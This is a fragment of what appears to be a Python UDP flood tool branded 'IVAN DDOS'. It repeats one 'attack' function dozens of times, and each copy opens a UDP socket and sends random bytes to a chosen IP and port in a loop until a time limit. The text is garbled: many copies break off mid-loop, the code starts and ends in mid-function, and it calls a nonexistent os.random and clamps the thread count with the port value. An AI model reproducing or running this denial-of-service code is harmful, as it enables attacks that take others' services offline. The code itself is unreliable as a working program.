        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

